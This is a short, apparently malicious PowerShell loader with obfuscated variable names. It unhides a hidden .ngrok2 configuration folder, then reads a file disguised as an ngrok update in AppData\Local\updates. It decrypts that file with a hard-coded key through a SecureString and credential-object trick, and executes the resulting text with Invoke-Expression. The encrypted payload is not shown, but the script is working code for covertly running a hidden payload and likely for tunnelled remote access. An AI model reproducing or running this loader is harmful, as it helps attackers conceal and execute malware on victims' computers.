attrib -S /s /d -H "$env:HOMEDRIVE$env:HOMEPATH\.ngrok2\*"
attrib -S /s /d -H "$env:HOMEDRIVE$env:HOMEPATH\.ngrok2"

$ybucsulacdkvsd = "$env:USERPROFILE\AppData\Local\updates\update_ngrok_dependency.bin"
$ygbxncs = Get-Content $ybucsulacdkvsd
[Byte[]] $uncmcvnaew = (1..32)
$vcsnlanca = ConvertTo-SecureString $ygbxncs -key $uncmcvnaew
$bdshuewoljs = New-Object system.Management.Automation.PSCredential("test", $vcsnlanca)
$nsjqusnhsd = $bdshuewoljs.GetNetworkCredential().Password
Invoke-Expression $nsjqusnhsd